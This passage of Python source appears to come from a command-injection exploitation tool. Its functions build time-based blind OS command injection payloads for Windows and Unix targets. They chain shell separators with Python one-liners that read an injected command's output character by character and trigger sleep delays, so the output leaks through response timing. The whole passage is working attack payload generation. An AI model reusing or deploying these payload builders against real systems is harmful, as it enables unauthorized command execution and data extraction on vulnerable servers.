    ...
    if settings.TARGET_OS == "win":
        ...
        if separator == ";":
            ...
            payload = (pipe +
                       # Find the length of the output, using readline().
                       "[ " + str(
                        output_length) + " != $(python -c \"print len(\'$(echo $(" + cmd + "))\')\") ] " + separator +
                       "$(python -c \"import time\ntime.sleep(0)\") " + pipe + "$(python -c \"import time\ntime.sleep(" + str(
                        timesec) + ")\")"
                       )
        else:
...
def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
    if settings.TARGET_OS == "win":
        python_payload = settings.WIN_PYTHON_DIR + " -c \"import os; print ord(os.popen('" + cmd + "').read().strip()[" + str(
            num_of_chars - 1) + ":" + str(num_of_chars) + "])\""
        if separator == "||":
            payload = (separator + " "
                                   "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
                       python_payload +
        ...
        if separator == ";":
            payload = (separator +
                       "str=$(python -c \"print ord(\'$(echo $(" + cmd + "))\'[" + str(num_of_chars - 1) + ":" + str(
                        num_of_chars) + "])\nexit(0)\")" + separator +
                       "if [ " + str(ascii_char) + " != ${str} ]" + separator +
                       "then $(python -c \"import time\ntime.sleep(0)\")" + separator +
                       "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
            ...
            pipe = "|"
            payload = (pipe +
                       "[ " + str(ascii_char) + " != $(python -c \"print ord(\'$(echo $(" + cmd + "))\'[" + str(
                        num_of_chars - 1) + ":" + str(num_of_chars) + "])\nexit(0)\") ] " + separator +
                       "$(python -c \"import time\ntime.sleep(0)\") " + pipe + "$(python -c \"import time\ntime.sleep(" + str(
                        timesec) + ")\")"
                       )
